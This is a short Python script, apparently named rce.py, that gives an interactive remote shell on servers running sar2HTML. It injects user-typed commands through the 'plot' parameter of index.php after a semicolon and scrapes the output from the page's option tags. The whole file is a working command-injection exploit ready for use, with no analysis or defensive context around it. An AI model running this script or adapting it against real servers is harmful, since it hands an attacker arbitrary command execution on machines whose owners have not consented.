import requests
import re
import sys


if len(sys.argv)>1:
        main_url = "http://%s/sar2HTML/index.php?plot=;" % sys.argv[1]
        print(main_url)

        while(True):
                payload = input("> ")

                url = main_url + payload
                s = requests.get(url)

                out = re.findall("<option value=(.*?)>", s.text)

                for item in out:
                        if "There is no defined host..." not in item:
                                if "null selected" not in item:
                                        print(item)

else:
        print("Using: python3 rce.py <ip>")
